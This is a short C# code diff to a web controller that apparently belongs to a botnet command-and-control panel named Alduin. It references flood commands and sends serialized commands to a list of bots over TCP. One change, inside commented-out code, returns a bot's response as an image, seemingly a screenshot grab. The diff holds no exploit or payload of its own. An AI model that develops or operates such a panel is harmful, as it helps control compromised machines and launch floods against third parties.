@@ -9,6 +9,8 @@ using MediatR;
 using Alduin.Logic.Mediator.Queries;
 using Newtonsoft.Json;
 using Alduin.Server.Commands.Floods;
+using Alduin.Web.Models.Commands.Commands;
+using System.Text;
 
 namespace Alduin.Web.Controllers
 {
@@ -593,12 +595,12 @@ namespace Alduin.Web.Controllers
                 status = false
             };
             var botlist = await _mediator.Send(bots);
-            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method).Replace(@"\", ""));
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method));
             return Json(response);
         }
         /*[Authorize]
-        [HttpGet]
-        public async Task<IActionResult> GetImg()
+        [HttpPost]
+        public async Task<IActionResult> GetImg([FromBody] GetImgModel model)
         {
             var method = new BaseCommands
             {
@@ -609,8 +611,9 @@ namespace Alduin.Web.Controllers
                 status = false
             };
             var botlist = await _mediator.Send(bots);
-            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method).Replace(@"\", ""));
-            return Json(response);
+            string response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method).Replace(@"\", ""));
+            byte[] img = Encoding.ASCII.GetBytes(response);
+            return File(img, "image/jpg");
         }*/
     }
 }
